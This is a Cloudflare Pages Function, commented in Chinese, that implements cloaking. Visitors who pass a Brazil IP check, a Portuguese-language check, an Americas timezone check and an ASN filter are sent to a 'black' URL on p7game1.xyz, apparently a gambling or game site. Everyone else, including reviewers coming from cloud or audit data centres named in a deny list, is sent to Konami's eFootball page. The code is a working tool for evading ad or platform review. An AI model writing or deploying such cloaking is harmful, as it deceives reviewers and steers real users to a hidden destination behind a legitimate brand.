export async function onRequest(context) {
  const { request } = context;
  const cf = request.cf;
  const userAgent = (request.headers.get("user-agent") || "").toLowerCase();
  const acceptLang = (request.headers.get("accept-language") || "").toLowerCase();
  
  // 1. 获取原始 HTML
  const response = await context.next();
  let html = await response.text();

  // === 核心配置（严禁修改占位符名称） ===
  const BLACK_URL = "https://www.p7game1.xyz/?ch=290101"; 
  const WHITE_URL = "https://www.konami.com/efootball/pt-br/"; 
  const PLACEHOLDER = "###SECURE_ACCESS_TOKEN###"; 
  // ================================

  // 1. 物理围栏：必须是巴西 IP
  const isBR = cf.country === "BR";

  // 2. 语言锁：浏览器必须包含葡语（审核员机房很难模拟此项）
  const isPT = acceptLang.includes("pt");

  // 3. 时区校验：必须是美洲/巴西时区
  const userTimezone = (cf.timezone || "").toLowerCase();
  const isBrazilTime = userTimezone.includes("america/");

  // 4. 运营商与机房深度清洗 (ASN 过滤)
  const asnOrg = (cf.asOrganization || "").toLowerCase();
  
  // 屏蔽名单：云服务商、审计机构机房
  const isDataCenter = /google|amazon|microsoft|facebook|akamai|cloudflare|linode|digitalocean|vultr|ovh|m247|zenlayer|choopa|leaseweb|hetzner|fastly/i.test(asnOrg);

  // 放行名单：巴西主流运营商
  const isLocalISP = /claro|vivo|tim|oi|embratel|telefonica|nextel|algar|sercomtel|mob|brisanet/i.test(asnOrg);

  // 5. 核心判定逻辑
  const isRealUser = isBR && isPT && isBrazilTime && !isDataCenter && isLocalISP;

  // 执行无痕替换：无论身份如何，都要抹除占位符，防止 DNS 报错
  const finalHtml = html.split(PLACEHOLDER).join(isRealUser ? BLACK_URL : WHITE_URL);

  return new Response(finalHtml, {
    headers: { 
      "content-type": "text/html;charset=UTF-8",
      "Cache-Control": "no-store, no-cache, must-revalidate, proxy-revalidate",
      "X-Content-Type-Options": "nosniff"
    }
  });
}